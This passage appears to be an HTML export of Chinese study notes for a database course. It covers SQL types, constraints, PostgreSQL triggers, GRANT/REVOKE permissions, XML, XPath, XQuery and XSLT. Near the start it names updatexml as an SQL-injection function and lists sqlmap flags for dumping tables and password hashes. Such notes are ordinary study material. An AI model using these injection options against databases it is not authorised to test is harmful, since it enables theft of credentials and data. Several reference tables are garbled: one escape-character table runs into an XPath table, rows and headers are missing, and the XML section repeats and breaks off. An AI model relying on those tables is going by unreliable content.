when 条件 then 表达式
else 表达式
end
*/
</code></pre>
<h2 id="一些sql注入中常用的函数-1"><a class="header" href="#一些sql注入中常用的函数-1">*一些SQL注入中常用的函数</a></h2>
<p>updatexml	一百度全都是讲注入的笑死了
UPDATEXML (XML_document, XPath_string, new_value); 
第一个参数： XML_document是String格式，为XML文档对象的名称，文中为Doc 
第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 
第三个参数：new_value，String格式，替换查找到的符合条件的数据 </p>
<h2 id="关于sqlmap-1"><a class="header" href="#关于sqlmap-1">*关于sqlmap</a></h2>
<p>-h输出帮助信息	-hh输出更详细的帮助信息
-u URL(记得加上注入点)
Enumeration里头表示你希望获取(retrieve)的后台的(back-end)信息</p>
<pre><code class="language-shell">-a, --all           Retrieve everything
-b, --banner        Retrieve DBMS banner
--current-user      Retrieve DBMS current user
--current-db        Retrieve DBMS current database
--passwords         Enumerate DBMS users password hashes
--tables            Enumerate DBMS database tables
--columns           Enumerate DBMS database table columns
--schema            Enumerate DBMS schema
--dump              Dump DBMS database table entries
--dump-all          Dump all DBMS databases tables entries
-D DB               DBMS database to enumerate
-T TBL              DBMS database table(s) to enumerate
-C COL              DBMS database table column(s) to enumerate File system access里头的参数可以让你读写文件。
</code></pre>
<h1 id="高级sql-1"><a class="header" href="#高级sql-1">高级SQL</a></h1>
<h2 id="一sql数据类型-1"><a class="header" href="#一sql数据类型-1">一、SQL数据类型</a></h2>
<p>Domain可以添加constrain；Domain不是强类型，如果底层的数据类型相同的话（比如下面的dollar和pounds）不同的Domain可以相互赋值。</p>
<pre><code class="language-sql">create type Dollars as numeric(12,2) ;      --创建数据类型
create domain Dollars as numeric(12, 2) not null;           --创建Domain
create domain Pounds as numeric(12,2);
</code></pre>
<p>Large-Object Types：对于大的对象，我们返回他的指针。</p>
<ul>
<li>blob: binary large object</li>
<li>clob: character large object</li>
</ul>
<h2 id="二integrity-constraints-1"><a class="header" href="#二integrity-constraints-1">二、Integrity Constraints</a></h2>
<p>完整性约束包括：域完整性、实体完整性（主键的约束）、参照完整性（外键的约束）和用户定义的完整性约束。常见的比如<code>not null</code>,<code>primary key</code>,<code>unique</code>。</p>
<h3 id="reference-integrity-constraints-1"><a class="header" href="#reference-integrity-constraints-1">Reference Integrity Constraints</a></h3>
<p>删除一个forgein key，怎么删？（比如删除计算机系，学生怎么办？）</p>
<ol>
<li>不让删（默认行为）</li>
<li>把相关的记录连带着删除了。但是这可能会导致多米诺骨牌效应，如果中间有一个是不让删除的，那么整个删除就失败了。</li>
</ol>
<p>这种连带行为的约束，用<strong>cascade</strong></p>
<pre><code class="language-sql">create table students(
    ...
    foreign key(dept_name) references department [on delete/update   cascade]
);
</code></pre>
<h3 id="check-1"><a class="header" href="#check-1">Check</a></h3>
<p>对于一般的条件检查，我们可以用check。</p>
<pre><code class="language-sql">create table SB (
    name varchar(4) not null,
    age integer check(age&gt;0) 
);
</code></pre>
<h3 id="assertion-1"><a class="header" href="#assertion-1">Assertion</a></h3>
<p>对于一些复杂的约束条件（往往可能和别的表、别的字段相关），我们无法把他简单的写在Check语句中，我们就需要assertion。这个特性并没有被广泛的支持。
过度的使用assertion会造成数据库效率的降低，因为每一次的插入都要执行一次判断。</p>
<pre><code class="language-sql">create assertion credits_earned_constraint check
    (not exists (select ID
    from student
    where tot_cred &lt;&gt; (select sum(credits)
        from takes natural join course
        where student.ID= takes.ID and grade is not null and grade &lt;&gt; ’F’);
</code></pre>
<h3 id="triggers-触发器-1"><a class="header" href="#triggers-触发器-1">Triggers 触发器</a></h3>
<p>A trigger is a statement that is <strong>executed automatically</strong> by the system as <strong>a side-effect of a modification</strong> to the database.
我们需要设置触发条件和触发行为。</p>
<pre><code class="language-sql">CREATE  TRIGGER trigger_name [BEFORE|AFTER|INSTEAD OF] event_name
ON table_name
[
 -- 触发器逻辑....
];
</code></pre>
<p>虽然触发器语法是SQL标准的一部分，但是大多数数据库系统用非标准的语法来说明触发器。比如postgresql，触发器的定义不包含执行内容，而是对每一行调用一个过程，使用<code>old</code>和<code>new</code>来访问包含该行的旧值和新的变量。触发器不进行rollback，而是发出一个异常。查阅手册，发现以下内容：</p>
<p>当一个PL/pgSQL函数当做触发器调用时，在顶层块会自动创建一些特殊变量。它们是：</p>
<ul>
<li>
<p><code>NEW</code></p>
<p>数据类型是<code>RECORD</code>；该变量为<strong>行级触发器</strong>中的<code>INSERT</code>/<code>UPDATE</code>操作保持新数据行。在语句级别的触发器以及<code>DELETE</code>操作，这个变量是null。</p>
</li>
<li>
<p><code>OLD</code></p>
<p>数据类型是<code>RECORD</code>；该变量为<strong>行级触发器</strong>中的<code>UPDATE</code>/<code>DELETE</code>操作保持新数据行。在语句级别的触发器以及<code>INSERT</code>操作，这个变量是null。</p>
</li>
<li>
<p><code>TG_NAME</code></p>
<p>数据类型是<code>name</code>；该变量包含实际触发的触发器名。</p>
</li>
<li>
<p><code>TG_WHEN</code></p>
<p>数据类型是<code>text</code>；是值为<code>BEFORE</code>、<code>AFTER</code>或<code>INSTEAD OF</code>的一个字符串，取决于触发器的定义。</p>
</li>
<li>
<p><code>TG_LEVEL</code></p>
<p>数据类型是<code>text</code>；是值为<code>ROW</code>或<code>STATEMENT</code>的一个字符串，取决于触发器的定义。</p>
</li>
<li>
<p><code>TG_OP</code></p>
<p>数据类型是<code>text</code>；是值为<code>INSERT</code>、<code>UPDATE</code>、<code>DELETE</code>或<code>TRUNCATE</code>的一个字符串，它说明触发器是为哪个操作引发。</p>
</li>
<li>
<p><code>TG_RELID</code></p>
<p>数据类型是<code>oid</code>；是导致触发器调用的表的对象 ID。</p>
</li>
<li>
<p><code>TG_RELNAME</code></p>
<p>数据类型是<code>name</code>；是导致触发器调用的表的名称。现在已经被废弃，并且可能在未来的一个发行中消失。使用<code>TG_TABLE_NAME</code>替代。</p>
</li>
<li>
<p><code>TG_TABLE_NAME</code></p>
<p>数据类型是<code>name</code>；是导致触发器调用的表的名称。</p>
</li>
<li>
<p><code>TG_TABLE_SCHEMA</code></p>
<p>数据类型是<code>name</code>；是导致触发器调用的表所在的模式名。</p>
</li>
<li>
<p><code>TG_NARGS</code></p>
<p>数据类型是<code>integer</code>；在<code>CREATE TRIGGER</code>语句中给触发器函数的参数数量。</p>
</li>
<li>
<p><code>TG_ARGV[]</code></p>
<p>数据类型是<code>text</code>数组；来自<code>CREATE TRIGGER</code>语句的参数。索引从 0 开始记数。非法索引（小于 0 或者大于等于<code>tg_nargs</code>）会导致返回一个空值。</p>
<p>所以我们要创建触发器，还要编写对应的函数，如下例：</p>
<pre><code class="language-sql">-- 创建触发器
create trigger TRIGGER_NAME [before insert]
on TABLE_NAME [for each row]
execute procedure borrow_no_morell();

-- 创建函数
create function borrow_no_morell() returns trigger as $borrow_no_morell$
begin
    if (select count(*) from borrow where cno=new.cno)&gt;2 then
    raise exception 'cannot borrow more than 3';
    end if;
    RETURN NEW;
end
$borrow_no_morell$ LANGUAGE plpgsql;
</code></pre>
<p>这里给两个书上的例子，如果考试考的话可能要书写这样格式的trigger。</p>
<p><img src="Basic/Database/../images/image-20210403141347067.png" alt="image-20210403141347067" /></p>
</li>
</ul>
<h2 id="三authorization-授权-以postgresql为例-1"><a class="header" href="#三authorization-授权-以postgresql为例-1">三、Authorization 授权-以POSTGRESQL为例</a></h2>
<ul>
<li>Forms of authorization on parts of  the database:
<ul>
<li>Read authorization - allows reading, but not modification of data.</li>
<li>Insert authorization - allows insertion of new data, but not modification of existing data.</li>
<li>Update authorization - allows modification, but not deletion of data.</li>
<li>Delete authorization - allows deletion of data</li>
</ul>
</li>
<li>Forms of authorization to modify  the database schema:
<ul>
<li>Index authorization - allows creation and deletion of indices.</li>
<li>Resources authorization - allows creation of new relations.</li>
<li>Alteration authorization - allows addition or modifying of attributes in a relation.</li>
<li>Drop authorization - allows deletion of relations.</li>
</ul>
</li>
</ul>
<p>我们可以利用View，把View的权限给用户，而不把relation的权限给用户。这样还可以简化用户操作。
<img src="Basic/Database/../images/1616644577045.png" alt="" />
所有的权限都来自于DBA（比如postgres），我们要让DBA把权限<strong>GRANT</strong>给其他用户，可以用<strong>REVOKE</strong>收回权限。</p>
<pre><code class="language-sql">GRANT &lt;privilege list&gt; on &lt;relation name or view name&gt; to &lt;user name&gt; [with grant option]     --能不能再把权限分发
REVOKE&lt;privilege list&gt; ON &lt;relation name or view name&gt;	 FROM &lt;user list&gt;  [ restrict | cascade ]       --cascade，把分发出去的权限也收回来
grant select, insert on instructor to U1, U2, U3;       --To grant users U1, U2, and U3 select and insert authorization on the instructor relation:
grant all privileges on instructor to reticence;		--授予所有权限.
revoke select on instructor from reticence;				--收回select权限
</code></pre>
<p>privilege list包括：（下面的所有权限都是对relation数据的操作，DML和DCL，不包括DDL（除了reference））</p>
<ul>
<li>select: allows read access to relation, or the ability to query using the view</li>
<li>insert: the ability to insert tuples.</li>
<li>update: the ability  to update using the SQL update statement.</li>
<li>delete: the ability to delete tuples.</li>
<li><strong>references</strong>: ability to declare foreign keys when creating relations.</li>
<li><strong>all privileges</strong>: used as a short form for all the allowable privileges.</li>
<li>DBMS没有实现更细粒度的权限管理，比如relation中的tuple权限。这个要由应用去管理。而我们甚至通常把所有的权限都交给应用程序，然后把权限都交给应用程序管理，</li>
</ul>
<p>ROLE：把权限赋给一个抽象的role，然后给具体的user指定一个role。</p>
<pre><code class="language-sql">create role instructor;     --创建role
grant select on takes to instructor;    --像给user授权一样给role授权
grant instructor to Amy;    --让user Amy拥有instructor的权限
</code></pre>
<p>数据库</p>
<pre><code class="language-sql">alter database third owner to reticence;
</code></pre>
<h2 id="四audit-trail-1"><a class="header" href="#四audit-trail-1">四、Audit trail</a></h2>
<p>审计跟踪（audit trail）是关于应用程序数据的所有更改（插入/删除/更新）的日志，以及一些信息，如哪个用户执行了更改和什么时候执行的更改。</p>
<h2 id="五在别的语言中使用-sql-1"><a class="header" href="#五在别的语言中使用-sql-1">五、在别的语言中使用 SQL</a></h2>
<p>在别的语言中使用SQL。有三种形式：</p>
<ul>
<li>
<p>嵌入式SQL：程序在编译前必须由一个特殊的预处理器进行处理。每一种语言的嵌入式SQL不同。由于不好用，所以用的很少。</p>
</li>
<li>
<p>动态SQL，比如开放数据库互连（Open DataBase Connectivity，ODBC），一般是用于基础设施的建设。</p>
<ul>
<li>用于应用程序与数据库服务通信的标准。所以每一个DB厂商都会提供。</li>
<li>标准定义了一个API
<ol>
<li>建立一个和服务器的连接</li>
<li>发送查询、更新请求等</li>
<li>获取返回结果</li>
</ol>
</li>
<li>Python有<a href="https://pypi.org/project/pyodbc/">pyodbc</a>，Rust有<a href="https://docs.rs/odbc-api/0.17.0/odbc_api/">odbc_api</a>。</li>
</ul>
</li>
<li>
<p>还有更高级的接口，让我们可以更方便的连接数据库。也是使用最广泛的。</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="databaseweb-xml"><a class="header" href="#databaseweb-xml">Database,Web-XML</a></h1>
<p>关于这篇提到的关于XML的内容，都是W3C组织规定的。可以很方便的在W3School找到权威详细的资料。</p>
<p><a href="https://www.w3school.com.cn/x.asp">中文W3school XML</a>
<a href="https://www.w3schools.com/xml/default.asp">英文W3scholos XML</a>
<a href="http://www.xpather.com/">XPath在线工具</a>和<a href="http://www.xpathtester.com/xquery">XQuery在线工具</a>，方便学习。</p>
<!-- more -->
<h2 id="xml"><a class="header" href="#xml">XML</a></h2>
<p><strong>XML</strong>可扩展标记语言，Extensible Markup Language 。还有一个<strong>JSON</strong>也可以实现类似的功能，不过更轻量一点。他们大都用于<strong>数据的传输</strong>，还有很常见的场景是<strong>配置文件</strong>。
XML是从SGML中扩展出来的。还有很相似的概念是HTML，不过HTML的<strong>标签tag</strong>都是定死的。XML则<strong>没有固定的标记</strong>，XML不能直接描述网页具体的外观，内容，它只是描述内容的数据形式和结构。 </p>
<p>一个例子，可以看出XML适合人的阅读。self-description but redundent，所以最好用于<strong>少量数据</strong>的传输。</p>
<h3 id="xml基础"><a class="header" href="#xml基础">XML基础</a></h3>
<p>看下面的Demo，包含了最常见的XML要素。</p>
<ul>
<li>
<p>prelog：下面的第一行。这是optional的，但是如果有的话必须在第一行。</p>
</li>
<li>
<p>Tag:  label for a section of data。</p>
</li>
<li>
<p>Element (元素) : section of data beginning with <code>&lt;tagname&gt;</code> and ending with matching <code>&lt;/tagname&gt;</code>。<code>&lt;tagname attr=&quot;...&quot;&gt;  text...  &lt;/tagname&gt;</code></p>
<ul>
<li>一个Element可以包含的内容有text、attributes、other elements，以及他们的组合。</li>
</ul>
</li>
<li>
<p>Attribute：Elements can have <strong>attributes</strong>.属性是<code>name=&quot;value&quot;</code>的形式，双引号是必须的。在tag的内部书写。什么时候用属性，什么时候用元素呢？</p>
<ul>
<li>建议：存储metadata用attribute，比如id。</li>
<li>attributes cannot contain multiple values (elements can)</li>
<li>attributes cannot contain tree structures (elements can)</li>
<li>attributes are not easily expandable (for future changes)</li>
</ul>
</li>
<li>
<p>comment：下面最后一行。和HTML一样。</p>
</li>
</ul>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;bookstore&gt;
    &lt;book category=&quot;cooking&quot;&gt;
        &lt;title lang=&quot;en&quot;&gt;Everyday Italian&lt;/title&gt;
        &lt;author&gt;Giada De Laurentiis&lt;/author&gt;
        &lt;year&gt;2005&lt;/year&gt;
        &lt;price&gt;30.00&lt;/price&gt;
    &lt;/book&gt;
    &lt;book category=&quot;children&quot;&gt;
        &lt;title lang=&quot;en&quot;&gt;Harry Potter&lt;/title&gt;
        &lt;author&gt;J K. Rowling&lt;/author&gt;
        &lt;year&gt;2005&lt;/year&gt;
        &lt;price&gt;29.99&lt;/price&gt;
    &lt;/book&gt;
    &lt;book category=&quot;web&quot;&gt;
        &lt;title lang=&quot;en&quot;&gt;Learning XML&lt;/title&gt;
        &lt;author&gt;Erik T. Ray&lt;/author&gt;
        &lt;year&gt;2003&lt;/year&gt;
        &lt;price&gt;39.95&lt;/price&gt;
    &lt;/book&gt;
&lt;/bookstore&gt;
&lt;!-- This is a comment --&gt;
</code></pre>
<p>XML文档是一个树形结构（树，不是森林，也就是说有唯一的一个根节点），比如上面那个XML文档对应于下面这个结构。事实上，下图为了方便把重复元素只画了一个：</p>
<p><img src="Basic/Database/../images/nodetree.gif" alt="nodetree" /></p>
<h3 id="命名空间namespace"><a class="header" href="#命名空间namespace">命名空间namespace。</a></h3>
<p><code>xmlns:element-name = &quot;xxx&quot;</code>。下面的两个table拥有不同的样式，看起来很不好。我们给他们分配不同的命名空间。</p>
<pre><code class="language-xml">&lt;root&gt;

    &lt;h:table xmlns:h=&quot;http://www.w3.org/TR/html4/&quot;&gt;
        &lt;h:tr&gt;
            &lt;h:td&gt;Apples&lt;/h:td&gt;
            &lt;h:td&gt;Bananas&lt;/h:td&gt;
        &lt;/h:tr&gt;
    &lt;/h:table&gt;

    &lt;f:table xmlns:f=&quot;https://www.w3schools.com/furniture&quot;&gt;
        &lt;f:name&gt;African Coffee Table&lt;/f:name&gt;
        &lt;f:width&gt;80&lt;/f:width&gt;
        &lt;f:length&gt;120&lt;/f:length&gt;
    &lt;/f:table&gt;

&lt;/root&gt;
</code></pre>
<h3 id="特殊字符怎么办"><a class="header" href="#特殊字符怎么办">特殊字符怎么办</a></h3>
<p>To store string data that may contain tags, without the tags being interpreted as subelements, use <strong>CDATA</strong> as below</p>
<pre><code class="language-xml">&lt;![CDATA[&lt;course&gt; … &lt;/course&gt;]]&gt;
</code></pre>
<p>Here, <code>&lt;course&gt;</code> and <code>&lt;/course&gt;</code> are treated as just strings. CDATA stands for “character data”.</p>
<p>不想用上面的CDATA，还可以用下面的转义。</p>
<p>| &lt;   | &lt;    | less than      |
|  | -- |
| nodename | 选取此节点的所有子节点。                                     |
| /        | 从根节点选取。                                               |
| //       | 从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。就是说儿子、孙子、曾孙都可以选到 |
| .        | 选取当前节点。                                               |
| ..       | 选取当前节点的父节点。                                       |
| @        | 选取属性。                                                   |
| |       | 表示或关系，合并多个查询<code>//book/title | //book/price</code>：选取 book 元素的所有 title 和 price 元素。 |</p>
<p><strong>谓语</strong>（Predicates）。谓语用来查找某个特定的节点或者包含某个指定的值的节点。谓语被嵌在方括号<code>[]</code>中。</p>
<p>在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果。可以看出那些基本的逻辑运算符和算数运算符都是可以用的。不过是<code>=</code>不是<code>==</code>哈：</p>
<p>| 路径表达式                             | 结果                                                         |
| :- | :-- | :-- |
| /bookstore/* | 选取 bookstore 元素的所有子元素。 |
| //*          | 选取文档中的所有元素。            |
| //title[@*]  | 选取所有带有属性的 title 元素。   |</p>
<p>XPath还有一些函数</p>
<p>| 函数名            | 说明                                    | 举例 |
|  | </p>
<p>上面的内容是书里提到的，应该是会考得。下面的不是。</p>
<p>Axis和Step。我也不知道这个有什么用。Step 是<code>axisname::nodetest[predicate]</code>，比如<code>/bookstore/child::book</code>表示Selects all book nodes that are children of the bookstore。</p>
<p>| AxisName           | Result                                                       |
| :-- |
| ancestor           | Selects all ancestors (parent, grandparent, etc.) of the current node |
| ancestor-or-self   | Selects all ancestors (parent, grandparent, etc.) of the current node and the current node itself |
| attribute          | Selects all attributes of the current node                   |
| child              | Selects all children of the current node                     |
| descendant         | Selects all descendants (children, grandchildren, etc.) of the current node |
| descendant-or-self | Selects all descendants (children, grandchildren, etc.) of the current node and the current node itself |
| following          | Selects everything in the document after the closing tag of the current node |
| following-sibling  | Selects all siblings after the current node                  |
| namespace          | Selects all namespace nodes of the current node              |
| parent             | Selects the parent of the current node                       |
| preceding          | Selects all nodes that appear before the current node in the document, except ancestors, attribute nodes and namespace nodes |
| preceding-sibling  | Selects all siblings before the current node                 |
| self               | Selects the current node                                     |</p>
<p>更多的函数。</p>
<h3 id="xquery"><a class="header" href="#xquery">XQuery</a></h3>
<p>这个比XPath强大，但是也更复杂。是基于XPath的。感觉这玩意儿有点像shell语言。</p>
<h4 id="flwor"><a class="header" href="#flwor">FLWOR</a></h4>
<p>一个基本的XQuery是由<strong>FLWOR</strong>组成的：</p>
<pre><code>for $x in /university/course
let $courseld := $x/@course_id
where $x/credits &gt; 3
return &lt;course_id&gt; {$courseld} &lt;/course_id&gt;
</code></pre>
<p>最基本的我们一般只需要<code>for</code>+<code>return</code></p>
<ul>
<li><code>for $x in [xpath查询]</code>，然后就会循环枚举每一个匹配到的项目。有点像select</li>
<li><code>return</code>字句可以对查询内容加工构造XML形式的结果，不过需要给变量外面套<code>{}</code></li>
</ul>
<p>其他的：</p>
<ul>
<li><code>let</code>可以用来加工查询结果，提取有效信息，然后赋值给变量。</li>
<li>
<h2 id="where可以对查询结果进行筛选"><a class="header" href="#where可以对查询结果进行筛选"><code>where</code>可以对查询结果进行筛选。</a></h2>
</li>
<li><code>order by</code>，显然是用来对查询结果排序的</li>
</ul>
<h4 id="高级特性"><a class="header" href="#高级特性">高级特性</a></h4>
<p>XQuery 含有超过 100 个内建的函数。这些函数可用于字符串值、数值、日期以及时间比较、节点和 QName 操作、序列操作、逻辑值等等。自定义函数：</p>
<pre><code>declare function 前缀:函数名($参数 AS 数据类型)
  AS 返回的数据类型
{

(: ...函数代码... :)

};
</code></pre>
<h3 id="xslt"><a class="header" href="#xslt">XSLT</a></h3>
<p>据说这个不怎么考。了解以下即可。</p>
<p>XSL = XML 样式表。XML 不使用预先定义的标签（我们可以使用任何喜欢的标签名），并且这些标签的意义<em>并不都那么容易被理解</em>。元素意味着一个 HTML 表格，一件家具，或是别的什么东西 - 浏览器不清楚如何显示它。XSL 可<em>描述</em>如何来显示 XML 文档！</p>
<p>XSL 包括三部分：</p>
<ul>
<li>XSLT：一种用于转换 XML 文档的语言。</li>
<li>XPath：一种用于在 XML 文档中导航的语言。</li>
<li>XSL-FO：一种用于格式化 XML 文档的语言。</li>
</ul>
<p>这个是用来转换的。什么意思呢？比如从XML转换成HTML，或者从一个XML转换成另一个XML。</p>
<p>XSLT Templates，也是一个XML文档。</p>
<pre><code class="language-xml">&lt;xsl:template match=&quot;/bank-2/customer&quot;&gt;
    &lt;custom&gt;
        &lt;xsl:value-of select=&quot;customer_name&quot;/&gt;
    &lt;/custom&gt;
&lt;/xsl:template&gt;
&lt;xsl:template match=&quot;*&quot;/&gt;

</code></pre>
<p>xsl:template ：用XPath来匹配一些节点</p>
<p>xsl:value-of ：标签的内容</p>
<h2 id="api"><a class="header" href="#api">API</a></h2>
<p>SAX: Simple API for XML。基本的XML解析器。</p>
<p>DOM: Document Object Model。这个是常用的，给我们提供一系列函数来操作文档树。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="databaseweb-xml-1"><a class="header" href="#databaseweb-xml-1">Database,Web-XML</a></h1>
<p>关于这篇提到的关于XML的内容，都是W3C组织规定的。可以很方便的在W3School找到权威详细的资料。</p>
<p><a href="https://www.w3school.com.cn/x.asp">中文W3school XML</a>
<a href="https://www.w3schools.com/xml/default.asp">英文W3scholos XML</a>
<a href="http://www.xpather.com/">XPath在线工具</a>和<a href="http://www.xpathtester.com/xquery">XQuery在线工具</a>，方便学习。</p>
<h2 id="xml-1"><a class="header" href="#xml-1">XML</a></h2>
<p><strong>XML</strong>可扩展标记语言，Extensible Markup Language 。还有一个<strong>JSON</strong>也可以实现类似的功能，不过更轻量一点。他们大都用于<strong>数据的传输</strong>，还有很常见的场景是<strong>配置文件</strong>。
XML是从SGML中扩展出来的。还有很相似的概念是HTML，不过HTML的<strong>标签tag</strong>都是定死的。XML则<strong>没有固定的标记</strong>，XML不能直接描述网页具体的外观，内容，它只是描述内容的数据形式和结构。 </p>
<p>一个例子，可以看出XML适合人的阅读。self-description but redundent，所以最好用于<strong>少量数据</strong>的传输。</p>
<h3 id="xml基础-1"><a class="header" href="#xml基础-1">XML基础</a></h3>
<p>看下面的Demo，包含了最常见的XML要素。</p>
<ul>
<li>
<p>prelog：下面的第一行。这是optional的，但是如果有的话必须在第一行。</p>
</li>
<li>
<p>Tag:  label for a section of data。</p>
</li>
<li>
<p>Element (元素) : section of data beginning with <code>&lt;tagname&gt;</code> and ending with matching <code>&lt;/tagname&gt;</code>。<code>&lt;tagname attr=&quot;...&quot;&gt;  text...  &lt;/tagname&gt;</code></p>
<ul>
<li>一个Element可以包含的内容有text、attributes、other elements，以及他们的组合。</li>
</ul>
</li>
<li>
<p>Attribute：Elements can have <strong>attributes</strong>.属性是<code>name=&quot;value&quot;</code>的形式，双引号是必须的。在tag的内部书写。什么时候用属性，什么时候用元素呢？</p>
<ul>
<li>建议：存储metadata用attribute，比如id。</li>
<li>attributes cannot contain multiple values (elements can)</li>
<li>attributes cannot contain tree structures (elements can)</li>
<li>attributes are not easily expandable (for future changes)</li>
</ul>
</li>
<li>
<p>comment：下面最后一行。和HTML一样。</p>
</li>
</ul>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;bookstore&gt;
    &lt;book category=&quot;cooking&quot;&gt;
        &lt;title lang=&quot;en&quot;&gt;Everyday Italian&lt;/title&gt;
        &lt;author&gt;Giada De Laurentiis&lt;/author&gt;
        &lt;year&gt;2005&lt;/year&gt;
        &lt;price&gt;30.00&lt;/price&gt;
    &lt;/book&gt;
    &lt;book category=&quot;children&quot;&gt;
        &lt;title lang=&quot;en&quot;&gt;Harry Potter&lt;/title&gt;
        &lt;author&gt;J K. Rowling&lt;/author&gt;
        &lt;year&gt;2005&lt;/year&gt;
        &lt;price&gt;29.99&lt;/price&gt;
    &lt;/book&gt;
    &lt;book category=&quot;web&quot;&gt;
        &lt;title lang=&quot;en&quot;&gt;Learning XML&lt;/title&gt;
        &lt;author&gt;Erik T. Ray&lt;/author&gt;
        &lt;year&gt;2003&lt;/year&gt;
        &lt;price&gt;39.95&lt;/price&gt;
    &lt;/book&gt;
&lt;/bookstore&gt;
&lt;!-- This is a comment --&gt;
</code></pre>
<p>XML文档是一个树形结构（树，不是森林，也就是说有唯一的一个根节点），比如上面那个XML文档对应于下面这个结构。事实上，下图为了方便把重复元素只画了一个：</p>
<p><img src="Basic/Database/../images/nodetree.gif" alt="nodetree" /></p>
<h3 id="命名空间namespace-1"><a class="header" href="#命名空间namespace-1">命名空间namespace。</a></h3>
<p><code>xmlns:element-name = &quot;xxx&quot;</code>。下面的两个table拥有不同的样式，看起来很不好。我们给他们分配不同的命名空间。</p>
<pre><code class="language-xml">&lt;root&gt;

    &lt;h:table xmlns:h=&quot;http://www.w3.org/TR/html4/&quot;&gt;
        &lt;h:tr&gt;
            &lt;h:td&gt;Apples&lt;/h:td&gt;
            &lt;h:td&gt;Bananas&lt;/h:td&gt;
        &lt;/h:tr&gt;
    &lt;/h:table&gt;

    &lt;f:table xmlns:f=&quot;https://www.w3schools.com/furniture&quot;&gt;
        &lt;f:name&gt;African Coffee Table&lt;/f:name&gt;
        &lt;f:width&gt;80&lt;/f:width&gt;
        &lt;f:length&gt;120&lt;/f:length&gt;
    &lt;/f:table&gt;

&lt;/root&gt;
</code></pre>
<h3 id="特殊字符怎么办-1"><a class="header" href="#特殊字符怎么办-1">特殊字符怎么办</a></h3>
<p>To store string data that may contain tags, without the tags being interpreted as subelements, use <strong>CDATA</strong> as below</p>
<pre><code class="language-xml">&lt;![CDATA[&lt;course&gt; … &lt;/course&gt;]]&gt;
</code></pre>
<p>Here, <code>&lt;course&gt;</code> and <code>&lt;/course&gt;</code> are treated as just strings. CDATA stands for “character data”.</p>
<p>不想用上面的CDATA，还可以用下面的转义。</p>
<p>| &lt;   | &lt;    | less than      |
|  | -- |
| nodename | 选取此节点的所有子节点。                                     |
| /        | 从根节点选取。                                               |
| //       | 从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。就是说儿子、孙子、曾孙都可以选到 |
| .        | 选取当前节点。                                               |
| ..       | 选取当前节点的父节点。                                       |
| @        | 选取属性。                                                   |
| |       | 表示或关系，合并多个查询<code>//book/title | //book/price</code>：选取 book 元素的所有 title 和 price 元素。 |</p>
<p><strong>谓语</strong>（Predicates）。谓语用来查找某个特定的节点或者包含某个指定的值的节点。谓语被嵌在方括号<code>[]</code>中。</p>
<p>在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果。可以看出那些基本的逻辑运算符和算数运算符都是可以用的。不过是<code>=</code>不是<code>==</code>哈：</p>
<p>| 路径表达式                             | 结果                                                         |
| :- | :-- | :-- |
| /bookstore/* | 选取 bookstore 元素的所有子元素。 |
| //*          | 选取文档中的所有元素。            |
| //title[@*]  | 选取所有带有属性的 title 元素。   |</p>
<p>XPath还有一些函数</p>
<p>| 函数名            | 说明                                    | 举例 |
|  | </p>
<p>上面的内容是书里提到的，应该是会考得。下面的不是。</p>
<p>Axis和Step。我也不知道这个有什么用。Step 是<code>axisname::nodetest[predicate]</code>，比如<code>/bookstore/child::book</code>表示Selects all book nodes that are children of the bookstore。</p>
<p>| AxisName           | Result                                                       |
| :-- |
| ancestor           | Selects all ancestors (parent, grandparent, etc.) of the current node |
| ancestor-or-self   | Selects all ancestors (parent, grandparent, etc.) of the current node and the current node itself |
| attribute          | Selects all attributes of the current node                   |
| child              | Selects all children of the current node                     |
| descendant         | Selects all descendants (children, grandchildren, etc.) of the current node |
| descendant-or-self | Selects all descendants (children, grandchildren, etc.) of the current node and the current node itself |
| following          | Selects everything in the document after the closing tag of the current node |
| following-sibling  | Selects all siblings after the current node                  |
| namespace          | Selects all namespace nodes of the current node              |
| parent             | Selects the parent of the current node                       |
| preceding          | Selects all nodes that appear before the current node in the document, except ancestors, attribute nodes and namespace nodes |
| preceding-sibling  | Selects all siblings before the current node                 |
| self               | Selects the current node                                     |</p>
<p>更多的函数。</p>
<h3 id="xquery-1"><a class="header" href="#xquery-1">XQuery</a></h3>
<p>这个比XPath强大，但是也更复杂。是基于XPath的。感觉这玩意儿有点像shell语言。</p>
<h4 id="flwor-1"><a class="header" href="#flwor-1">FLWOR</a></h4>
<p>一个基本的XQuery是由<strong>FLWOR</strong>组成的：</p>
<pre><code>for $x in /university/course
let $courseld := $x/@course_id
where $x/credits &gt; 3
return &lt;course_id&gt; {$courseld} &lt;/course_id&gt;
</code></pre>
<p>最基本的我们一般只需要<code>for</code>+<code>return</code></p>
<ul>
<li><code>for $x in [xpath查询]</code>，然后就会循环枚举每一个匹配到的项目。有点像select</li>
<li><code>return</code>字句可以对查询内容加工构造XML形式的结果，不过需要给变量外面套<code>{}</code></li>
</ul>
<p>其他的：</p>
<ul>
<li><code>let</code>可以用来加工查询结果，提取有效信息，然后赋值给变量。</li>
<li>
<h2 id="where可以对查询结果进行筛选-1"><a class="header" href="#where可以对查询结果进行筛选-1"><code>where</code>可以对查询结果进行筛选。</a></h2>
</li>
<li><code>order by</code>，显然是用来对查询结果排序的</li>
</ul>
<h4 id="高级特性-1"><a class="header" href="#高级特性-1">高级特性</a></h4>
<p>XQuery 含有超过 100 个内建的函数。这些函数可用于字符串值、数值、日期以及时间比较、节点和 QName 操作、序列操作、逻辑值等等。自定义函数：</p>
<pre><code>declare function 前缀:函数名($参数 AS 数据类型)
  AS 返回的数据类型
{

(: ...函数代码... :)

};
</code></pre>
<h3 id="xslt-1"><a class="header" href="#xslt-1">XSLT</a></h3>
<p>据说这个不怎么考。了解以下即可。</p>
<p>XSL = XML 样式表。XML 不使用预先定义的标签（我们可以使用任何喜欢的标签名），并且这些标签的意义<em>并不都那么容易被理解</em>。元素意味着一个 HTML 表格，一件家具，或是别的什么东西 - 浏览器不清楚如何显示它。XSL 可<em>描述</em>如何来显示 XML 文档！</p>
<p>XSL 包括三部分：</p>
